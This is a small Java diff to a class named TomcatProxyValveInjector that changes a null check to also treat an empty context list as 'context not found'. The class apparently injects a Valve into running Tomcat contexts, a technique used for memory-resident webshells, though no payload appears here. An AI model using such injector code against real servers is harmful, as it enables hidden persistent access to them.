@@ -41,7 +41,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts == null) {
+        if (contexts == null || contexts.isEmpty()) {
             msg += "context not found";
         } else {
             for (Object context : contexts) {
